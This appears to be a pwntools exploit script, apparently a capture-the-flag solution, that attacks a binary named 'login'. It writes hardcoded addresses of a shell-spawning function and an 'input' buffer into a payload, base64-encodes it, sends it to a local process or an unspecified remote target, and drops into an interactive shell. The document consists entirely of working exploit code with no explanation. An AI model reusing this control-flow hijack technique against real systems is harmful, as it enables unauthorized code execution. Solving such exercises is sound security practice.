#!/usr/bin/python3

from pwn import *
from base64 import b64encode, b64decode

elf = ELF('./login')

if args.LOCAL:
    r = process([elf.path])
else:
    r = remote()

GET_SHELL = 0x08049284

payload = b''
payload += p32(GET_SHELL)
payload += p32(GET_SHELL)
payload += p32(elf.symbols['input'])  # rbp

r.sendline(b64encode(payload))

r.interactive('')
